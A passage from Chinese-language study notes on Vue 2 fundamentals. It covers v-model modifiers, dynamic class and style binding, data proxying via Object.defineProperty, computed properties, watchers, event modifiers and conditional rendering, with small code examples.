  v-model.number  会将我输入的数字自动转成数字类型
 -->


> v-model.trim
- 如果输入的内容首尾有很多的空格, 通常我们希望将其取出

- trim修饰符可以过滤内容左右两边的空格
<!-- 
  <input type="text" v-model.trim='message'>
 -->


> 要点:
- 1. 修饰符.lazy的使用
- 2. v-model绑定的结果都是字符串

--------------------------

### 动态绑定属性    v-bind
- 数据的单向绑定 数据只能从data流向页面

- 前面我们学习的指令主要作用是将值插入到我们模板的内容中, 但是除了内容需要动态决定外, 某些属性我们也希望动态来绑定


> v-bind:'属性' = "表达式"
> :'属性' = "表达式"
- 当我们加上v-bind:后面引号中的内容就当做js表达式去执行了
- 该变量就会去data中去找
<!-- 
  <a :href="url">点我跳转到百度</a>
  <a :href="url.toUpperCase()">点我跳转到百度</a>
  <a :href="Date.now()">点我跳转到百度</a>

  data: {
    url: 'http://www.baidu.com'
  }
 -->

<!-- 
    HTML部分
    <div id="app">
      <img v-bind:src="imgURL" alt="">
      <a v-bind:href="aHref">链接</a>
    </div>

    JS部分
    const app = new Vue({
      el:'#app',
      // 要是动态的修改src属性, 一般从服务器请求过来的数据都放在data里面, 再通过语法动态的绑定到html中
      data: {
        imgURL: ['./links/1.jpg'],
        aHref: 'https://www.baidu.com'
      }
    })
 -->

> 技巧
- 我们使用在标签属性中使用 v-bind 绑定一个对象的时候 相当于将一些属性添加到了 标签属性中
<!-- 
  <a
    v-bind="
      item.blank
        ? { target: '_blank', rel: 'noopener noreferrer' }
        : false
    "
  >

  相当于在 a标签中 添加了 target 和 rel 属性
 -->


> v-bind 动态绑定 class属性   -- 字符串写法
> <h2 class='title' :class='mood'></h2>
- 当动态添加class 和 普通class混合使用的时候 vue的部分不会覆盖掉普通的class部分

- 适用于：
- 样式的类名不确定 适用于动态指定
<!-- 
  <h2 class='title' :class='mood'></h2>

  data: { mood: 'happy' }

  渲染为
  <h2 class='title happy'></h2>
    通过v-bind绑定的属性 引号中是表达式 vue在解析的时候将a作为变量去data中找对应的数据

  样式的类名不确定 适用于动态指定：
  methods: {
    changeClass() {
      const arr = [happy, sad, normal]
      const index = Math.floor(Math.random()*3)
      this.mood = arr[index]
    }
  }
-->


> v-bind 动态绑定 class属性   -- 数组写法
> <h2 class='title' :class='classArr'></h2>
- 适用于
- 样式的类名不确定有多少， 名字也不确定的时候我们可以用数组的方式 获取样式的类名是请求回来的数据

- 因为我们将样式的类名维护在一个数组中 数组可以定义在data中，这样我们删除数组中的元素就相当于删除一个类名 push一个元素就相当于添加一个类名 完全是用操作数组的方式控制类名
<!-- 
  <h2 class='title' :class='classArr'></h2>

  data: { classArr: ['class1', 'class2', 'class3'] }

  methods: {
    changeClass() {
      this.classArr.shift()
      this.classArr.push('class4')
    }
  }
 -->


> v-bind 动态绑定 class属性   -- 对象语法
> <h2 v-bind:class='classObj'>
- 适用于：
- 要绑定的样式 个数确定 名字也确定 要动态的决定用不用
- 对象的写法适用于 决定改样式显示与否

- 将样式名：boolean组成一个对象 根据true 和 false 来确定是否应用该样式 我们通过布尔值来控制类名的添加与否 true:添加 false:不添加
<!-- 
  <h2 :class='classObj'></h2>

  data: {
    classObj: {
      calss1: true, 
      class2: false
    }
  }

  methods: {
    changeClass() {
      this.classObj.calss1 = false
    }
  }
 -->


> 总结:
- 以后实际开发中, 固定要有的class我们用普通的写法, 如果以后需要动态修改的class我们使用v-bind的方式


> 案例: 点击按钮后改变文字颜色 再次点击复原
- 单独的使用条件控制一个class是否显示

<!-- 
    <div id='app'>
      <h2 v-bind:class='active:isActive'>{{message}}</h2>
      <button v-on:click='btnClick'>Send</button>
    </div>

    let app = new Vue({
      el:'#app',
      data: {
          message: '你好啊',
          isActive: true
      },
      methods: {
        btnClick: function() {
            this.isAcitve = !this.isActive;
        }
      }
    });


    style
    active: { background: red }
 -->

--------------------------

### 案例 点击对应选项变色, 其它选项复原
- 需求: 点击列表中的哪一项, 那么该项的文字变成红色
- 思路:
- 既然class是通过布尔值决定添加与否的, 那么就让它的值是个判断表达式{active:currentIndex == index}
- 每次点击的时候 我把index传递给currentIndex 让他们相等

<!-- 
    <div id="app">
      <ul>

        // 哪个是多条v-for就写在哪里
        <li v-bind:class='{active:currentIndex == index}' v-for='(item, index) in movies' v-on:click='change(index)'>{{item}}</li>
      </ul>
    </div>

    const app = new Vue({
      el:'#app',
      data: {
        movies: ['海王', '海尔兄弟', '火影忍者', '进击的巨人'],

        // 这里声明一个变量currentIndex 在data中书写就相当于let声明, 可以使用在标签中, 我们定义一个currentIndex 用来表示当前的元素的状态
        currentIndex:undefined
      },
      methods: {
        // 标签中通过实参把index 传递进来, 每次点击就把这个index 赋值给currentIndex
        change: function(index) {
          this.currentIndex = index;
        }
      }
    })

    解析一下:
    首先我们class的添加与否 是跟true 和 false 有关系的
    v-bind:class='{active:currentIndex == index}'
    我们在data:{ currentIndex = 0 }

    <li :class='{active: 0 === currentIndex}'>    // true 所以添加 
    <li :class='{active: 1 === 0}'>
    <li :class='{active: 2 === 0}'>
 -->

--------------------------

### v-bind绑定style
- 我们能发现style指定内联样式的时候 style 也是kv成对出现的
- 同时 引号中的部分是表达式 如果当中出现了变量就是去组件实例身上找
<!-- 
  :style:'{fontSize: fsize + "px"}'
 -->

- 动态绑定style的好处就是我们不用操作dom通过操作data中的变量就可以达到修改内联样式的效果

- 我们再书写css属性名的时候, 使用驼峰式写法 或者短横线分隔


> v-bind绑定style  对象的写法
<!-- 
  // 我们将对样式的处理也放在data中定义一个对象
  <div :style='{styleObj}'>style的测试段落</div>

  data() {
    return {
      styleObj: {
        fontSize: '40px'
      }}}
 -->


> 动态绑定属性的原因:
<!-- 
    以后我们在开发项目的时候, 会把网页中的一个部分一个部分开发成一个个的组件, 这样别的页面就可以拿来复用, 
    
    但是组件的颜色之类的就不能写死, 因为有的页面可能要求是白色 有的页面可以会是绿色, 所以我们要根据用的人决定是什么样的颜色, 这时候我们就要动态的绑定样式 
-->


> v-bind绑定style  数组的写法
- <h2 :style='[变量名1, 变量名2]'>{{message}}</h2>
- 使用对象语法绑定的话 传递进去的是一个数组 数组中对应的样式都会出现在class里面 成并列关系
- 也就是数组里面配置样式对象 
<!-- 
   <h2 :style='[baseStyle1, baseStyle2]'>{{message}}</h2>

   const vm = new Vue({
    el: '#app',
    data: {
      baseStyle1:{background:'red'},
      baseStyle2:{fontSize:'50px'},
    }})

    // 最终效果会合并到一起
    <h2 style='background:'red'; fontSize:'50px''>{{message}}</h2>
 -->
   
> 总结
- 我们使用v-bind绑定样式 把不变化的样式正常写 变化的样式使用:style来指定
- 动态的数据都往data里面放

--------------------------

### Vue中的数据代理
- 我们在vue中定义的数据都会放在data中，该数据都是通过Object.defineproperty方法添加上去的，添加上的数据都会在vue对象上

- 当我们读取data中的数据的时候 该数据会触发getter，getter从哪获取到数据显示（_data）
- 当我们设置data中的数据的时候 该数据会触发setter，修改getter读至的数据（_data）

> 回顾 Object.defineProperty 方法
- 该方法在vue底层很多地方都被使用 数据代理 数据劫持 计算属性等

> Object.defineProperty(指定对象, '属性名', {配置参数})
- 使用该方法给一个对象添加属性，并对该属性进行限制 / 更改
- 使用该方法添加的属性 默认是不能被枚举 不能被删除 不能被修改的

- 参数：
  - 1. 给哪个对象添加属性
  - 2. 给这个对象添加什么属性
  - 3. 配置对象

  - 配置对象：基本配置
  - value:        属性值
  - enumerable:   true / 默认值：false    枚举
  - writable:     true / 默认值：false    重写
  - configurable: true / 默认值：false    删除


  - 配置对象：高级配置
  - enumerable:   true / 默认值：false
  - configurable: true / 默认值：false

  - get:
    该方法会在 设置的属性 被读取的时候调用 该函数必须有返回值 返回值为该属性的属性值
  - set:
    该方法会在 设置的属性 被修改的时候调用 该函数会接收到参数 参数为被修改后的值

<!-- 
  对 get 和 set 的理解 
  get： 我们给一个对象使用defineproperty方法添加了属性名 但是值去哪取？ 靠get
        get负责去一个地方得到值

  set： 那修改该值的话靠set 改成啥还可以影响到get return那个值（根源）
 -->


> 小例子：
- 需求：
- 定义一个人的对象 这个人的对需要有age属性 但是age属性是靠number的值确定的 且每当number的值被修改的时候 person里面的age也会被修改
<!-- 
  let number = 18

  let person = {
    name: 'sam',
    sex: '男',
  }

  Object.defineProperty(person, 'age', {

    // 当有人读取person的age属性的时候 该函数就会被调用 且返回值就是age的值 属性值 它必须有返回值
    get() {
      return number
    },

    // 当有人修改person的age属性时，set函数就会被调用 且会收到age被修改为的具体值
    set(value) {
      console.log('age的值被修改为：', value)

      // 把修改后的值 赋值给age的根源number 这样当我们修改age的 值的时候也能够影响到number
      number = value
    }
  })

  这样 age的值就是number的值 每当读取age的时候就会去调用getter 然后重新得到number最新的值
  number 和 person 明明是两个东西 但是借助defineproperty方法产生了关联
  上面的person通过这个方法确实有age属性但是你现用我现取 想取去靠get 相当于去哪取 想改靠set 改成啥 还可以影响那个根源的值
 -->

<!-- 
  let person = {
      name: "sam",
      sex: "男"
  }

  // 定义监视变量的源
  let watchNum = 0
  
  // 定义一个受监视的变量
  Object.defineProperty(person, "age", {
      get() {
          return watchNum
      },

      set(val) {
          watchNum = val
      }
  })
 -->

- 简单的使用原声js的方式实现了一下 计算属性
- 当我们读取了或者修改了 obj.url 的时候 界面更新
<!-- 
  let urlSource = "www.baidu.com"
  let obj = {}

  Object.defineProperty(obj, "url", {
      get() {
          return urlSource
      },


      // 主要是在setter中写更新页面的逻辑
      set(val) {
          urlSource = val
          $("#root").innerHTML = obj.url
      }
  })

  $("#root").innerHTML = obj.url

  function $(el) {
      return document.querySelector(el)
  }
 -->


> 数据代理
- 通过一个对象 代理对另一个对象中属性的操作 （读写）就叫做数据代理
- 案例：
<!-- 
  比如 有一个obj 它有一个属性x 假如我要访问x那就是obj.x 改的话就是obj.x赋值就可以了
  
  还有一个对象 proxyObj 我想让proxyObj 也能访问到x 也希望proxyObj也能修改x
  通过proxyObj代理对另一个对象obj中的属性去操作 这就是数据代理


  let obj = {x: 100}
  let proxyObj = {y: 200}

  // 通过这个方法在代理对象中添加要访问obj中的属性
  Object.defineProperty(proxyObj,  'x', {
    get() {
      return obj.x
    },

    set(value) {
      obj.x = value
    }
  })
 -->

------

> vue中的数据代理
- 接下来我们看看 Vue里面是怎么使用数据代理的
- 我们将变量name定义在data中（vue会将我们传入的data保存在vm身上一份 vm._data）
<!-- 
  vm._data = data
 -->

- 有人当读取name的时候getter开始工作 getter就会将data中的name给过去
- 有人通过vm来修改name的时候，setter开始工作 setter就会将data中的name修改掉
<!-- 
  const vm = new Vue({
    el: '#root',
    data:{
      name: 'sam'
    }
  })


  有人读取name   < ---  getter  < ---  data.name
  有人修改nama   --- >  setter  --- >  data.name
-->  


> 总结
- vue中的数据代理： 通过vm对象来代理data对象中的属性的操作
- vue中数据代理的好处：
  更加方便的操作data中的数据

- 基本原理：
  通过 Object.defineProperty 把data对象中所有的属性添加到vm上 为每一个添加到vm上的属性 都指定一个getter setter 在getter setter 内部去操作data中对应的属性


--------------------------

### 数据劫持
- 上面有一句话 从开始 贯穿到 现在 就是 假如data中的数据发生变化 页面中使用data数据的地方就会自动更新
<!-- 
  data.name 变化了          view 中使用 name 的地方 就会自动更新
 -->

- 要想实现这个功能 那就需要让vue监测到data中的数据改变了 如果vue监测不到data中的属性发生了变化 那vue怎么帮你去更新页面呢 为了完成这个功能它就必须将_data中的东西进行一番修改
<!-- 
  我们前面说 
  const vm = new Vue({
    el: '#root',
    data:{
      name: 'sam'
    }
  })

  我们传入的data 会保存在_data中一份 原本我们期待_data中的数据结构也是一样的

  data:{                _data:{   
    name: 'sam'           name: 'sam'
  }                     }

  但事实上不是 vue将_data中的数据 又做了一番处理 为了实现响应式

 -->

--------------------------

### 计算属性
- 我们先了解一下什么叫做属性 对于vue来说 它认为data中的数据就是属性
- 所谓的计算属性 就是拿着已有的属性 去加工去计算然后得到一个全新的属性 

- 计算属性书写在 computed 配置项中 它的类型是一个对象

- 定义：
- data中不能定义计算属性 可以利用data已有的属性计算出新的结果

- 原理：
- 底层借助了Object.defineproperty方法提供的getter 和 setter

- 优势：
- 与methods相比 内部有缓存机制 复用效率更高 调试方便

- 注意：
- 计算属性最终会在vm身上 直接读取使用即可
- 如果计算属性要被修改 那必须要写set函数去响应修改 且set中要引起计算时依赖的数据发生改变
<!-- 
  new Vue({
    el:'#root',
    data() {
      return {
        firstName: '张',
        lastName: '三'
      }},

    methods: {
      showInfo() {
        return this.firstName + '-' + this.lastName
      }},

    // 计算属性的配置项
    computed:{ }
  })
 -->


> 计算属性的详解
> 计算属性的对象写法
- computed中 需要传递属性名 和 属性值， 属性值是一个对象
- 对象有有两个方法 get set
- get 和 set中的this就是vm
<!-- 
  computed: {
    attr: {
      get,
      set
    }
  }
 -->
<!-- 
  computed:{
    fullName: {

      // 当有人读取fullName的时候get就会被调用 且返回值就是fullName的值
      get() {
        return this.firstName + '-' + this.lastName
      },

      // 如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set
      // 当fullName被修改的时候该函数会被调用
      set(value) {
        const arr = value.split('-')
        this.firstName = arr[0]
        this.lastName = arr[1]
      }
    }
  }
 -->

> get方法调用的时机：
- 1. 初次调用fullName时 get会被调用
- 2. 所依赖的数据发生变化的时候 get会被调用

- 上面的案例中就是不管姓还是名被修改的时候get都会重新调用 但是依赖数据没有发生变化的时候 计算属性 fullName 会走缓存


> set方法调用的时机
- 如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set
- 当fullName被修改的时候该函数会被调用

- 在computed中定义属性(函数名) 跟data中定义的属性使用的方式都是一样的 使用的时候都是
<!-- 
    app.books
    app.fullName
 -->


> 计算属性的函数写法
- 更多的情况是 计算属性是不需要修改的 更多的是计算出来在页面上做呈现
- 这时候就不需要set方法 这时候我们就可以简写计算属性 将属性名写成一个函数 函数体的内容就是计算属性的属性值
<!-- 
  computed:{
    fullName() {
      return this.firstName + '-' + this.lastName
    }
 -->


> 总结：
- 1. 计算属性直接写函数名就可以 当属性名使用
- 2. 计算属性一直监听数据的变化， 如果有变化立即返回一个值
<!-- 
  computed 还有一个功能就是 缓存的功能， 就是 当数据不变化的时候就一直保存之前的值， 不管你使用多少次 

  计算属性监听的是computed内部的数据, 当页面上和computed内部一致的数据发生变化时, computed内部数据会重新计算渲染页面上

  也就是说页面上的数据和computed里面的数据是相互关联的
-->

- 3. 计算属性在多次调用的时候只会调用一次, methods的话你调用几次就会在实例中执行几次, 计算属性的性能会比较好

- 4. 在html结构中 直接使用变量名 不用加()调用函数
<!-- 
  <h3>{{computed中的变量名}}</h3>
 -->

------

### 案例 计算属性的应用 总价格
- 需求:
- 页面上输出总价格
<!-- 
    <div id="app">
        <h3>总价格:{{totalPrice}}</h3>
    </div>

    const app = new Vue({
      el: '#app',
      data: {
        books: [
          {id:1, name:'unix编程艺术', price:119},
          {id:2, name:'代码大全', price:105},
          {id:3, name:'深入理解计算机原理', price:98},
          {id:4, name:'现代操作系统', price:87}
        ]
      },

      computed: {
        totalPrice: function() {
          let result = 0;
          for(let i = 0 ; i<this.books.length; i++) {
            result += this.books[i].price;
          }

          return result;
        }

        // 使用es6的 reduce方法
        totalPrice: function() {
          let result = this.books.reduce(function(tmp, item, index){
            return tmp + item.price;
          }, 0)

          return result;
        }
      }


      // 整理一下的写法
      total() {
        return this.books.reduce((pre, item) => {
          return pre += item.price
        }, 0)
      }

    })
 -->

--------------------------

### 监视属性 watch
- 我们做一个小案例
- 需求：
- 点击按钮 更新天气状态

- 下面我们使用的是计算属性完成的逻辑 逻辑很简单 通过计算属性决定展示在页面上的值是什么 然后通过点击按钮改变计算属性中依赖的变量的值
<!-- 
  <div @click='showWeather'>
    今天天气很， {{info}}  
  </div>

  new Vue({
    el: '#root',
    data() {
      return { isHot: false }
    },
    computed: {
      info() { return this.isHot ? '炎热' :'凉爽' }
    },
    methods: {
      showWeather() { this.isHot = !this.isHot }
    }
  })
 -->

- 但是上面的做法有一个坑，就是当我页面上不使用 计算属性的时候 我点击按钮
- 开发者工具显示没有改变数据，但实际是改变了
<!-- 
  比如我点击按钮后 正常 开发者工具会显示
  isHot: false  --- isHot: true

  实际上 开发者工具会显示
  isHot: false  --- isHot: false

  但数据其实是改了的 只是开发者工具会有问题
 -->


> 监视属性
- 监视属性的变化 在配置项中写监视谁 监视哪个属性
- 不仅可以监视data中的属性 计算属性也可以监视

- 注意：
- 在watch里面配置监视属性的时候，要监视的属性前面不用使用this 
- 但是在监视属性内部的配置函数 handler 里面要想获取data中的变量要写this

- 配置项：
- watch: { 
  要监视的属性: { 

    // 当要监视的属性发生变化时 会自动调用该回调
    handler(新值，旧值) { 不需要return 可以直接写逻辑 }

    // 初始化时让handler调用一下 默认值是false 立即马上执行
    immediate: false

    // 当为true的时候开启深度监视
    deep: true
  }
}

- watch的类型是一个对象，要监视的属性的值也是一个对象 对象里有handler函数 该函数在监视的属性发生变化的时候回被调用
<!-- 
  比如上面的案例 我们点击按钮后修改了 变量 isHot
  现在我想监视isHot的变化 只要它发生了变化就要通知我

  watch: {
    isHot: {

      // 当isHot发生变化的时候该函数会被调用
      handler(newValue, oldValue) { }

      // 立即马上执行 默认值是false 初始化时让handler调用一下
      immediate: false
    }
  }

  那有什么作用呢？ 比如我们保存的是温度 那我就可以拿到新的温度和旧的温度 相减拿到差后做后续的逻辑
  对一个属性做监测 然后对比 然后做逻辑处理

  immediate
  当为false的时候 只有监视的属性发生改变的时候才会执行handler里面的代码
  当为true的时候 监视属性没有发生改变 一上来就会执行一遍handler里面的代码

 -->


> 深度监视
- vue中的watch默认不监测对象内部值的改变 一层
- 配置 deep: true 可以监测对象内部值的改变

- 备注：
- vue自身可以监测对象内部值的改变 但vue提供的watch默认不可以
- 使用watch时 根据数据的具体结构 决定是否开启深度监测


- 需求
- 我需要监视numbers里面的a属性 不监视b怎么做？
<!-- 
  data: {
    numbers: {
      a: 1
      b: 1
    }
  }

  watch: {

    // 注意属性名的本质是字符串 我们不能直接值 number.a 的形式
    'number.a': {
      handler(n, o) {
        console.log(n, o)
      }
    }


    // 那假如我们这么写能监测到number的变化么 
    'number': {
        handler(n, o) {
          console.log(n, o)
        }
      }
    }
    答案是不能，因为这么写是监测number:{ } vue将整个对象当做监视的对象 并不是对象里面的某一个值 也就是vue监视的这个对象的地址值

    而这个对象中的属性发生变化 vue并不能监测到 那怎么才能监测到呢？
 -->

- 为了完成深度监视 我们可以开启深度监视
- 在监视的属性的配置对象中添加 deep: true
<!-- 
  'number': {
      handler(n, o) {
        console.log(n, o)
      }

      // 监视多级结构中所有属性的变化
      deep: true
    }
  }
 -->


> 监视的简写形式
- 简写形式的前提是 你不需要deep 不需要immediate的时候 当只有handler的时候就可以开启简写形式

- 将要监视的属性 写成一个函数的形式 函数名就是监视的属性名
<!-- 
  watch: {
    isHot(n, o) {

    }
  }
 -->


> 总结：
- 监视属性watch 当被监视的属性变化的时候 回调函数自动调用 handler 进行相关操作
- 监视的属性必须存在 才能进行监视
- 监视属性的两种写法
  - 1. new Vue时传入watch配置对象
  - 2. 通过vm.$watch监视
  - 通过vue实例 调用 $watch方法
    - 参数1 监视谁
    - 参数2 回调 当a发生改变的时候 会在回调里面
<!-- 
  vm.$watch('a', function(newVal, oldVal) {
    // 做点什么 
    this 是vm
  })
 -->

> 技巧：
- watch还可以监视$route

--------------------------

### watch 和 computed 的对比
- 上面的案例中我们是通过计算属性来得到fullName
- 现在我们使用一下watch来做，那我们就要思考 我们要监视谁 应该是firstName 和 lastName吧
<!-- 
  data: {
    fullName: 'zhang-san'
  }
  watch: {
    firstName(n) {
      this.fullName = n + this.lastName
    }

    lastName(n) {
      this.fullName = this.firstName + n
    }
  }
 -->

- 使用watch做的话会比较麻烦我们要准备好一个fullName 还要分别对 姓 和 名 进行监视
- 上面感觉是计算属性来实现会比较好一些 但是有的时候可能watch会比较好

- 比如：当姓发生改变的时候 全名延迟1秒再发生变化
<!-- 
  // watch

  firstName(n) {
    setTimeout(()=>{
      this.fullName = n + this.lastName
    }, 1000)
  }
 -->


> 总结：
- 监视属性里可以开启异步任务来维护数据
- 计算属性里不能开启异步任务来维护数据
<!-- 
  // computed

  fullName(n) {
    setTimeout(()=>{

      // 计算属性靠着函数内部的return来得到属性值 但是 异步的timeout是将返回值给timeout了而不是给fullName了 所以fullName的返回值是undefined
      return this.firstName + this.lastName
    }, 1000)
  }
 -->

- 1. computed能完成的功能 watch都可以完成
- 2. watch能完成的功能 computed不一定能完成 例如 watch可以进行异步操作

- 两个重要的小原则
- 1. 被vue管理的函数 最好写成普通函数 这样this的指向才是vm或者组件实例对象
- 2. 所有不被vue管理的函数 定时器 ajax回调等 最好写成箭头函数 这样this的指向才是vm或者组件实例

--------------------------

### 事件的监听 / 处理
- 在前端开发中, 我们需要经常和用户交互, 这个时候 我们就必须监听用户发生的事件, 比如点击 拖拽 键盘事件等等

- 回调的事件必须填写在vue实例里的methods属性里面
- methods中配置的函数 不要用箭头函数 否则this就不是vm了
- methods中配置的函数 都是被vue管理的函数 this的指向是vm 或 组件实例对象
- 事件的回调需要配置在methods中 最终会在vm上


> v-on:事件名=’事件处理函数‘   指令
- 作用: 绑定事件监听器
- 缩写: @+事件名   
<!-- v-on:click  ==  @click -->
- 预期: function object
- 参数: event
<!-- 
  @事件名=回调函数
 -->


> v-on的简单用法
- 因为前面使用呢了指令语法 ’‘ 可以写表达式
<!-- 
  <div id="app">
    <button v-on:click='count++'>+</button>
  </div>
 -->


> v-on: 的语法糖 @事件名
<!-- 
  <button @click='pre'>-</button>
 -->


> @事件名=’事件处理函数 [(参数)] ‘
- 1. 事件处理函数 不传递参数的情况下 methods中对应的方法会接收到 event 对象
<!-- 
  <button @click='add'>+</button>
  methods: {

    // 该方法会接收到event对象 vue帮我们传递进来的
    add(event) { this.count++; },
  }
 -->

- 2. 事件处理函数 需要传递参数的情况下 我们可以直接在小括号中写参数 如果同时要使用 event 需要用 $event 关键字来占位
> $event 参数 event对象的关键字
<!-- 
  <button @click='add(66, $event)'>+</button>
  methods: {

    // 该方法会接收到event对象 vue帮我们传递进来的
    add(number, event) { 
      console.log(number)
      console.log(event.target)
    },
  }
 -->


> 给组件绑定 原生事件
- 正常我们在组件标签内部使用 @click 的时候 vue都会把这些原生事件当做自定义事件处理

- 如果我们想给组件绑定原生的点击事件 我们要使用.native修饰符
<!-- 
  <Student @click.native='callback'>
 -->


**注意：**
- 1. 如果methods中的方法 需要传递参数 但是在函数调用时没有传递(添加了小括号但是没有参数), 打印结果会是undefined
<!-- 
  <button @click='add()'>+</button>   // 没有传递参数

  methods: {
    add(abc) {
      console.log(abc);     // undefined
    }
  }

  方法中需要传入abc参数, 但是调用的时候并没有传递, 有添加小括号但是没有参数
-->

- 2. 调用函数时( ) 里面的参数 如果加上''代表字符串, 如果不加的话 就去data中找变量

--------------------------

### 事件的修饰符
- 在某些情况下, 我们拿到event的目的可能是进行一些事件的处理
- vue提供了修饰符来帮助我们方便的处理一些事件
- 修饰符可以连续写


> 语法: @事件名.修饰符
- 修饰符还可以串联使用
<!-- 
  <button @click.stop.prevent='doThis'>点击</button>
 -->


> 停止冒泡
- @事件名.stop     - 相当于调用 event.stopPropagation()
- 当结构出现嵌套的时候 子元素的事件会冒泡到父元素上
- 阻止冒泡一般加载子元素的身上
<!-- 
  <button @click.stop='doThis'>点击</button>
-->


> 阻止默认行为
- @事件名.prevent  - 相当于调用 event.preventDefault()
<!-- 
  <button @click.prevent='doThis'>点击</button>
-->


> 回调仅触发一次
- @事件名.once     - 只触发一次回调
<!-- 
  事件的回调只触发一次
  <button @click.once='doThis'>点击</button>
-->


> 使用事件的捕获模式
- @事件名.capture
- 嵌套结构的时候会有捕获的情况 一般该修饰符加在父元素身上


> 只有event.target是当前操作的元素时候才可以触发
- @事件名.self
- 某种程度上说 .self 也能阻止冒泡
<!-- 
  <div @click.self='showInfo'>
    <button @click='showInfo>
  <div>

  我们加在了父元素的身上 如果有人触发了div身上的click 并且target是div的时候才会调用showInfo

  我们点击的是button 然后会产生冒泡 div身上的click事件也会触发 但是 div的click事件是有条件的 只有target是自己 事件也是自己的时候才会触发
  所以button的click的事件是冒泡到div上了 但是却不会触发
 -->


> 事件的默认行为立即执行 无需等待事件回调执行完毕
- @事件名.passive
- 当我们给内容溢出的父元素绑定 wheel事件的时候 会产生一个问题 它会先执行回调的内部逻辑，执行完毕后再触发默认行为 滚动滚动条

- 当我们给wheel.passive加上这个修饰符的时候 会先执行默认的行为比如滚动滚动条 然后再处理回调的内部逻辑

- 移动端的项目可能会用的比较多一些

**扩展：**
- @scroll 是滚动滚动条的时候 会触发事件
<!-- 
  scroll的特点 当滚动条到底了 再次滚动滚动条的时候不会触发事件了
 -->

- @wheel
- 特点：
- 1. 鼠标滚轮滚动的时候 会触发事件
- 2. 当鼠标滚轮滚动的时候 会先触发滚动的事件 执行内部的回调 回调执行完毕后再执行默认行为（将滚动条往下滚动）
<!-- 
  wheel的特点 即使滚动条到底了 我们滚动滚轮的时候也会触发事件
 -->


> 给组件绑定事件    @click.native
- .native
- 在我们需要监听一个组件的原生事件时, 必须给对应的事件加上.native修饰符 才能监听
<!-- 
  <back-top @click.native=‘callback’></back-top>

  但是vue3.0已经删除, 不添加该修饰符也可以给组件绑定事件
 -->


> 案例 阻止事件冒泡
- 下面的例子中 点击按钮后 同时也会触发 div的点击事件
<!-- 
  <div id="app">
    <div class='test' @click='divClick'>

      // 阻止按钮的点击事件冒泡
      <button @click.stop='btnClick'>按钮</button>
    </div>
  </div>
 -->


> 案例 阻止默认行为
- 下面的例子里, input type=submit 的情况下 点击这个按钮会把form表达里的数据收集起来提交到指定页面上, 有些情况下我不希望它自动帮我提交 当我点击这个按钮的时候 做些逻辑处理后再提交, 可是如果不阻止input的默认行为的话, 提交表单的功能和回调中的逻辑处理的顺序是 提交表达先发生的, 所以要阻止表单的默认行为
<!-- 
  <input type='submit' @click.prevent='submitClick'>
 -->


> 键盘事件 按下特定的键触发回调
- @事件名.{keyCode | keyAlias | enter} 
- @事件名.按键别名
- 只当事件是从特定键位触发时才触发回调

- 常用的按键别名
- keyCode:  键盘编码  @keyup.13
            该方式不被推荐了 尽量不要使用该方式 请使用别名

- keyAlias
- enter:    回车
- delete:   删除
- esc       退出
- space     空格
- tab       退格  
            该按键有一个神奇的功能就是将焦点切走 它要配合keydown来使用

- up        上下左右
- down
- left
- right

- vue未提供别名的按键 可以使用按键原始的key去绑定 当按键名称由多个单词组成的时候我们要使用aaa-bbb的形式连接使用（短横线命名）
<!-- 
  console.log(e.key, e.keyCode)    // CapsLock 13

  @keyup.caps-lock
 -->

- 系统修饰键： ctrl alt shift meta
  - 1. 配合keyup使用
      按下修饰键的同时 再按下其他键 随后释放其他键 事件才会被触发

  - 2. 配合keydown使用
      正常触发事件

  - 3. 系统修饰键.按键
      只有系统修饰键和按键配合使用的时候才会触发回调
      @keyup.ctrl.y

<!-- 
  <input type="text" value='' placeholder="输入文字" @keyup.enter='showInfo'>

  只有按下 enter 键位的时候才会被触发回调
 -->


> 配置按键的别名
- 语法：
- Vue.config.keyCodes.别名 = 键码
<!-- 
  Vue.config.keyCodes.huiche = 13
 -->

--------------------------

### v-show
- v-show的用法 和 v-if非常相似, 也用于决定一个元素是否渲染
- 语法：
- <div v-show='表达式'>测试段落</div>
- vue会根据表达式的布尔值决定该元素是显示还是隐藏
- 表达式中如果写变量的情况下 它会去data中找变量

- 注意：
- 使用v-show来控制显示和隐藏的元素 本质是通过 display: none / block 来控制的
- 它的节点还在

<!-- 
  <div v-show='1 === 1'>测试段落</div>
  <div v-show='false'>测试段落</div>
 -->

--------------------------

### v-if, v-else-if, v-else
- 这三个指令与js的条件语句if else else if类似
- vue的条件指令可以根据表达式的值 在dom中渲染或销毁元素 或 组件
- 注意：
- dom的结构会根据v-if的结果 销毁 和 创建

- 应用场景:
- 当满足条件的时候 我才希望元素渲染在dom结构中 不满足条件的时候 不希望它渲染出来
- 一般都是在服务器端传过来的数据 决定某一大段需要不需要显示在dom结构中

> 语法:
- v-if='布尔类型的值 或者 表达式'

> v-if的原理
- v-if根据 布尔类型的值 true false决定元素是否渲染在html结构中
- v-if='true'   对应的元素 才会 显示在html结构中
- v-if='false'  对应的元素 不会 显示在html结构中
<!-- 
  实际开发中 我们会定义一个变量 来决定布尔值的状态, 通过这个变量来控制元素是否显示
 -->


> 案例 简单的使用v-if v-else
- 我们通过控制isShow变量的值 来决定显示哪个部分, 但为true的时候显示v-if的部分, 当为false时, 会显示v-else的部分

- 我们看下下面的按钮是用v-show来实现的 当点击按钮后 n会加1 当n的值为1 2 3的时候会显示对应的div
<!-- 
  <div id="app">
    <div v-show='n==1'>react</div>
    <div v-show='n==2'>vue</div>
    <div v-show='n==3'>angular</div>

    <button @click='n++'>点我加1</button>
  </div>

  const app = new Vue({
    el:'#app',
    data: {
      n: 0
    }})

  当我点击按钮的 data 中的n发生了变化 用到n的地方就会重新解析 发生 n == 1 是成立的于是乎就显示了
 -->

> v-if, v-else if, v-else
- 它的逻辑和我们js中的逻辑一样 一旦v-if成立就不会走v-else if的逻辑
<!-- 
  if 判断     else if 判断 如果成立
  if 判断     else if 不判断
  if 判断     else if 不判断
 -->

- 这种场景用的不多, 因为这需要在标签内部写很多逻辑, 遇到这种情况不如在computed中计算好在拿出来
<!-- 
  // 标签中写入if else if else
  <div id="app">
    <p v-if='score>=90'>优秀</p>
    <p v-else-if='score>=80'>良好</p>
    <p v-else-if='score>=60'>及格</p>

    // 它不用接条件
    <p v-else>不及格</p>
  </div>

  const app = new Vue({
    el:'#app',
    data: {
      score:90
    }
  })

  会把符合条件的结构渲染在html结构中
 -->


> 总结：
- 当我们页面的dom元素切换的比较频繁的时候 建议使用v-show
- 注意：
